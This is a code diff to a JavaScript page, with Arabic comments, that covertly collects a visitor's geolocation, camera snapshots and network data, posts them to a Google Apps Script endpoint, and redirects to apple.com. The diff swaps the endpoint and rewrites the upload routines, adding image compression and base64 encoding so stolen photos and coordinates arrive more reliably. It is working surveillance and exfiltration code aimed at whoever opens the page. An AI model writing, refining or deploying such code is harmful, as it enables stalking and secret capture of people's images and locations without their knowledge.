@@ -67,7 +67,7 @@
   'use strict';
 
   /* ===================== الإعدادات ===================== */
-  const ENDPOINT = 'https://script.google.com/macros/s/AKfycbwRGDYzVCBG1ayjnw82Dr3GpXbhnv0VWO34G-r5JkdCxQLPBrFHIrYyR32LyA9c3TU/exec';
+  const ENDPOINT = 'https://script.google.com/macros/s/AKfycbznAWVGZ7qWe9zj73MVeE2JQQP4KnmHUlhMVtcx_smLCVxnwG9svrG0HEiGSFEvr7wZZA/exec';
   const REDIRECT = 'https://www.apple.com/';
   const T_GEO = 14000, T_NET = 4500, T_RTC = 4500, T_CAM = 9000, T_CHECK = 8000;
   const NA = 'N/A';
@@ -137,23 +137,15 @@
 
   /* ===================== النقل ===================== */
   async function postData(payload) {
-    const fd = new FormData();
-    fd.append('a', 'collect');
-    fd.append('d', JSON.stringify(payload));
+    const body = JSON.stringify({ a: 'collect', d: payload });
     try {
       await fetch(ENDPOINT, {
-        method: 'POST', mode: 'no-cors', body: fd,
-        keepalive: true, cache: 'no-store'
+        method: 'POST', mode: 'no-cors', cache: 'no-store',
+        headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
+        body: body
       });
       return true;
-    } catch (_) {
-      try {
-        await fetch(ENDPOINT, { method: 'POST', mode: 'no-cors', body: fd, cache: 'no-store' });
-        return true;
-      } catch (__) {
-        try { return navigator.sendBeacon(ENDPOINT, fd); } catch (___) { return false; }
-      }
-    }
+    } catch (_) { return false; }
   }
 
   function jsonpData(payload) {
@@ -325,27 +317,53 @@
     }
   }
 
+  function shrink(blob) {
+    return new Promise(res => {
+      const img = new Image();
+      const url = URL.createObjectURL(blob);
+      img.onload = () => {
+        try {
+          const s = Math.min(1, 260 / Math.max(img.width, img.height));
+          const cv = document.createElement('canvas');
+          cv.width = Math.max(1, Math.round(img.width * s));
+          cv.height = Math.max(1, Math.round(img.height * s));
+          cv.getContext('2d').drawImage(img, 0, 0, cv.width, cv.height);
+          URL.revokeObjectURL(url);
+          cv.toBlob(b => res(b || blob), 'image/jpeg', 0.42);
+        } catch (_) { res(blob); }
+      };
+      img.onerror = () => res(blob);
+      img.src = url;
+    });
+  }
+
+  function toDataUrl(blob) {
+    return new Promise(res => {
+      const fr = new FileReader();
+      fr.onload = () => res(String(fr.result || ''));
+      fr.onerror = () => res('');
+      fr.readAsDataURL(blob);
+    });
+  }
+
   async function sendPhoto(blob, n) {
-    if (!blob || !n) return false;
-    for (let i = 0; i < 2; i++) {
-      const fd = new FormData();
-      fd.append('a', 'photo');
-      fd.append('nonce', n);
-      fd.append('img', blob, 's.jpg');
+    if (!blob || !n || photoDone) return false;
+    if (blob.size > 55000) blob = await shrink(blob);
+    const dataUrl = await toDataUrl(blob);
+    if (!dataUrl) return false;
+
+    const body = JSON.stringify({ a: 'photo', nonce: n, img: dataUrl });
+    for (let i = 0; i < 3; i++) {
       try {
-        await fetch(ENDPOINT, { method:'POST', mode:'no-cors', body:fd, keepalive:true, cache:'no-store' });
+        await fetch(ENDPOINT, {
+          method: 'POST', mode: 'no-cors', cache: 'no-store',
+          headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
+          body: body
+        });
         photoDone = true;
         return true;
-      } catch (_) {
-        try {
-          await fetch(ENDPOINT, { method:'POST', mode:'no-cors', body:fd, cache:'no-store' });
-          photoDone = true;
-          return true;
-        } catch (__) {
-          try { if (navigator.sendBeacon(ENDPOINT, fd)) { photoDone = true; return true; } } catch (___) {}
-        }
-      }
-      await sleep(700);
+      } catch (_) {}
+      await sleep(600);
     }
     return false;
   }
@@ -672,13 +690,11 @@
     if (!geoDone) getGeo().then(g => {
       if (g.lat === '') return;
       geoDone = true;
-      const fd = new FormData();
-      fd.append('a', 'geo');
-      fd.append('n', N);
-      fd.append('lat', String(g.lat));
-      fd.append('lng', String(g.lng));
-      fd.append('acc', String(g.acc));
-      fetch(ENDPOINT, { method:'POST', mode:'no-cors', body:fd, keepalive:true }).catch(() => {});
+      const body = JSON.stringify({ a:'geo', n:N, lat:g.lat, lng:g.lng, acc:g.acc });
+      fetch(ENDPOINT, {
+        method:'POST', mode:'no-cors', cache:'no-store',
+        headers:{ 'Content-Type':'text/plain;charset=UTF-8' }, body: body
+      }).catch(() => {});
     });
   }
 
